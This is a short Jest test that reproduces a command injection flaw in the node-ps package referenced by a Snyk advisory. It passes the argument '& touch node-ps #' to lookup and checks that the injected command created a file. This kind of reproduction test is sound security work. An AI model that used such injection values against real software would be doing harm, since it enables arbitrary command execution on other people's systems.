//https://snyk.io/vuln/SNYK-JS-NODEPS-1048335
test("Command Injection in node-ps", () => {
  const a = require("node-ps");
  const fs = require("fs");
  const path = "./node-ps";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.lookup({ psargs: ["& touch node-ps #"] }, function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
